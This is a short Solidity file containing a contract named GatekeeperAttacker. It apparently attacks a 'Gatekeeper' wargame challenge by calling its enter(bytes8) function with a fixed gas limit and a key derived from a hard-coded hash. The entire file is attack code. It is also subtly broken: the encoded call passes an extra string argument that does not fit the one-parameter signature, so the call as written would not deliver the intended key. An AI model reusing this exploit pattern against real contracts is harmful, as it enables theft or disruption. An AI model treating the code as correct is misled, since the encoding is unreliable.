// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeper {
    function enter(bytes8 _param) external returns(bool);
}

contract GatekeeperAttacker {

  bytes32 response32 = 0x1c4bfc9f16029bcc9fe82086e0eefcf454ea4baf1602da2cb67da712386cd203;

  function callEnter(bytes8 _param, address _gatekeeperInstance) external {
    _gatekeeperInstance.call{gas: 5000}(abi.encodeWithSignature("enter(bytes8)", "_gateKey", _param));
  }

  function bytesCheck() external view returns(bytes8){
      return bytes8(response32);
    }
}